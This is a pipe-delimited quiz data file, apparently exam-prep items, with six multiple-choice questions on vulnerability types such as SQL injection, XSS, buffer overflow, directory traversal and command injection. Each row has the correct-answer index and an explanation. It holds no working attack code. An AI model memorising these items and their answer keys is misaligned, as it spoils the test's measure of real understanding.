# Domain 2.0 - Threats, Vulnerabilities, and Mitigations
# Subdomain 2.3 - Vulnerability Types
# Format: question|answer_a|answer_b|answer_c|answer_d|correct_idx|explanation|domain|subdomain

What type of vulnerability allows attackers to inject malicious SQL commands into database queries?|Cross-site scripting (XSS)|SQL injection|Buffer overflow|Directory traversal|1|SQL injection vulnerabilities allow attackers to insert malicious SQL commands into input fields that are used in database queries. This can lead to unauthorized data access, modification, or deletion. XSS targets browsers, buffer overflow targets memory, and directory traversal accesses files.|2.0 Threats, Vulnerabilities, and Mitigations|2.3 Vulnerabilities

Which vulnerability type allows attackers to write data beyond allocated memory boundaries?|Memory leak|Buffer overflow|Integer overflow|Race condition|1|Buffer overflow vulnerabilities occur when a program writes data beyond the allocated buffer boundaries, potentially overwriting adjacent memory and allowing arbitrary code execution. Memory leaks waste memory, integer overflows cause numerical errors, and race conditions involve timing issues.|2.0 Threats, Vulnerabilities, and Mitigations|2.3 Vulnerabilities

What vulnerability allows attackers to inject malicious scripts into web pages viewed by other users?|SQL injection|Cross-site scripting (XSS)|Cross-site request forgery (CSRF)|Directory traversal|1|Cross-site scripting (XSS) allows attackers to inject malicious scripts (usually JavaScript) into web pages that are then executed in other users' browsers. SQL injection targets databases, CSRF exploits authenticated sessions, and directory traversal accesses files.|2.0 Threats, Vulnerabilities, and Mitigations|2.3 Vulnerabilities

Which vulnerability allows unauthorized access to files and directories outside the web root?|SQL injection|Directory traversal|XSS|Command injection|1|Directory traversal (path traversal) vulnerabilities allow attackers to access files and directories outside the intended web root using relative path sequences like ../ to navigate the file system. SQL injection targets databases, XSS targets browsers, and command injection executes OS commands.|2.0 Threats, Vulnerabilities, and Mitigations|2.3 Vulnerabilities

What type of vulnerability exists when applications fail to properly validate user input?|Race condition|Input validation vulnerability|Cryptographic weakness|Privilege escalation|1|Input validation vulnerabilities occur when applications don't properly validate, sanitize, or filter user input. This can lead to injection attacks (SQL, XSS, command), buffer overflows, and other exploits. Race conditions involve timing, cryptographic weaknesses involve encryption, and privilege escalation gains higher access.|2.0 Threats, Vulnerabilities, and Mitigations|2.3 Vulnerabilities

Which vulnerability allows attackers to execute operating system commands through a web application?|SQL injection|Command injection|XSS|CSRF|1|Command injection (OS command injection) allows attackers to execute arbitrary operating system commands through vulnerable web applications that pass unsanitized user input to system shells. SQL injection targets databases, XSS targets browsers, and CSRF exploits sessions.|2.0 Threats, Vulnerabilities, and Mitigations|2.3 Vulnerabilities

